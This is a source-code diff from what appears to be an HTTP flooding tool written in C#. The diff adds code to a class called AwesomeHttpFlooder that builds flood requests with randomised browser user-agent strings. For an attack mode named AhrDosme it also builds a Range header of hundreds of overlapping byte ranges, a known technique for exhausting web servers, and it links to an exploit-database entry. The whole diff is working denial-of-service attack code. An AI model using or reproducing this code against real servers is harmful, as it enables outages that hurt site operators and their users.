@@ -4,6 +4,7 @@ using System.Text;
 using GAS.Core.AttackInformation;
 using RandomStringGenerator;
 using RandomStringGenerator.Expressions;
+using RandomStringGenerator.Helpers;
 
 namespace GAS.Core.Attacks {
     public class AwesomeHttpFlooder:IAttacker {
@@ -23,7 +24,6 @@ namespace GAS.Core.Attacks {
                 
             _flooder = new AsyncFlooder( info, threadCount );
             this._headers = this.CreateHeaderExpression( attackParams );
-            this._headers.ToString();
             this._exprBuffers = new int[ threadCount ][];
             var c = this._headers.ComputeLengthDataSize();
             for (var i = 0; i < threadCount; i++)
@@ -70,9 +70,21 @@ namespace GAS.Core.Attacks {
             bld.AppendLine( "Mozilla/5.0 (Windows NT 6.{I:D:0:2}) AppleWebKit/{I:D:536:537}.{I:D:0:35}"+
                 " (KHTML, like Gecko) Chrome/{I:D:25:35}.0.{I:D:1100:1800}.{I:D:0:10}"+
                 " Safari/{I:D:536:537}.{I:D:0:35}" );
+            //lot's of http range  requests
+            //Moar info: http://1337day.com/exploits/16729
             if ( p.AttackType == HttpAttackType.AhrDosme ) {
-                
+                bld.Append( "Range:bytes=" );
+                var l = Generators.Random.Next(600, 1000 );
+                var l2 = Generators.Random.Next( 30 );
+                for (var i = 0; i < l; i++) {
+                    bld.Append( l2 >> 1 + ( i %  l2 )  );
+                    bld.Append( '-' );
+                    bld.Append( i );
+                    if ( i < l - 1 ) bld.Append( ',' );
+                }
+                bld.AppendLine();
             }
+            bld.AppendLine();
             return ExpressionParser.Create( bld.ToString() );
         }
     }
